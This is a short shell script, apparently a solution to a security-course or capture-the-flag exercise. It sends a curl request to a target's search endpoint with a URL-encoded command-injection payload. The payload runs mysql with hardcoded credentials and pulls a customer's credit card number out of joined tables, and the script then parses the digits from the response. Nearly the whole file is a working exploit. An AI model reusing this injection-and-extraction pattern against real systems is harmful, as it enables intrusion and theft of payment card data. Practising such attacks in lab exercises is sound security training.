#!/bin/sh

# Solution was available in the source of the page itself.

curl 'http://'$1':6661/search/?q=QUICK%20BROWN%20FOX%20JUMP%22;mysql%20-usecprog_3_3%20-psecprog_3_3%20-D%20secprog_3_3%20-h%20127.0.0.1%20-e%20%22select%20Concat%28%27%20$%27,%20fininfo.fin_cc_number,%20%27$%27%29%20AS%20CARD_INFO%20from%20transactions%20join%20customers%20ON%20customers.id%20=%20transactions.customer_id%20%20join%20fininfo%20ON%20fininfo.id%20=%20transactions.fininfo_id%20WHERE%20customers.first_name=%27john%27%20AND%20last_name=%27doe%27%20LIMIT%201;%22%22' -s >.tmp

awk -F"[$]" '{print $2}' .tmp > .tmp2
awk '{$1=$1}1' .tmp2 > .tmp3
grep -Eo '[0-9]{1,20}' .tmp3
rm .tmp .tmp2 .tmp3
